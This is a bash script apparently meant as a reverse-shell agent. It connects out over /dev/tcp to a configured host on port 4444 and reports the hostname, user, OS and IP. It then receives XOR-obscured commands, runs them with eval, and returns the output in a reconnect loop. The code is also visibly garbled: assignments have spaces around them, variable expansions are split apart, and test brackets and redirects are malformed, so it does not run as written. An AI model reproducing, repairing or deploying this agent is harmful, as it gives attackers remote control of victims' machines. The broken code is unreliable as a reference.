#!/bin/bash

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 4444

get_local_ip() {
    ip route get 8.8.8.8 2>/dev/null | awk '{print $7; exit}' || echo "N/A"
}

xor_encrypt() {
    local data = "$1"
    local key = "$2"
    local result = ""
    local key_len = $ {
    }
    for ((i = 0; i < $ {
    }; i++)); do
    local char = "$ {
        data:$i:1
    }"
    local key_char = "$ {
        key:$((i % key_len)):1}"
        printf -v byte '%d' "'$char"
        printf -v key_byte '%d' "'$key_char"
        printf -v xor_byte '%d' "$((byte ^ key_byte))"
            printf -v xor_char '\\x%02x' "$xor_byte"
            result += $(printf "$xor_char")
            done
            echo -n "$result"
        }

        connect_server() {
            while true; do
            echo "[*] Connecting to $SERVER_HOST:$SERVER_PORT"

            exec 3<>/dev/tcp/$SERVER_HOST/$SERVER_PORT 2>/dev/null
            if [$? -eq 0]; then
            echo "[+] Connected!"

            read -t 10 -r key < &3
            if [-z "$key"]; then
            echo "[-] No key received"
            exec 3>&-
            sleep 5
            continue
            fi

            echo "[+] Key received"

            hostname = $(hostname)
            user = $(whoami)
            os = $(uname -s)
            arch = $(uname -m)
            agent_ip = $(get_local_ip)

            info = "{\"os\":\"$os\",\"hostname\":\"$hostname\",\"user\":\"$user\",\"architecture\":\"$arch\",\"agentIP\":\"$agent_ip\"}"

            echo -n "$info" > &3
            sleep 0.5

            echo "[+] Handshake complete"

            while true; do
            read -t 300 -r encrypted_cmd < &3
            if [$? -ne 0] || [-z "$encrypted_cmd"]; then
            echo "[-] Connection lost"
            break
            fi

            command = $(xor_encrypt "$encrypted_cmd" "$key")

            echo "[+] Command: $ {
                command:0:50
            }..."

            if ["$command" = "SYSINFO"]; then
            output = "
                OS: $os
                Hostname: $hostname
                User: $user
                Arch: $arch
                Agent IP: $agent_ip
                Current Dir: $(pwd)
            "
            elif ["$command" = "SCREENSHOT"]; then
            output = "ERROR: Screenshot not supported in shell agent"
            elif ["$command" = "exit"] || ["$command" = "quit"]; then
            output = "Agent disconnecting..."
            echo -n "$(xor_encrypt "$output" "$key")<END>" > &3
            break
            else
                output = $(eval "$command" 2 > &1)
            if [-z "$output"]; then
            output = "Command executed (no output)"
            fi
            fi

            encrypted_output = $(xor_encrypt "$output" "$key")
            echo -n "$ {
                encrypted_output
            }<END>" > &3

            echo "[+] Response sent"
            done

            exec 3>&-
            else
                echo "[-] Connection failed"
            fi

            echo "[*] Reconnecting in 5 seconds..."
            sleep 5
            done
        }

        if command -v bash >/dev/null 2 > &1; then
        connect_server
        else
            echo "[-] Bash required"
        exit 1
        fi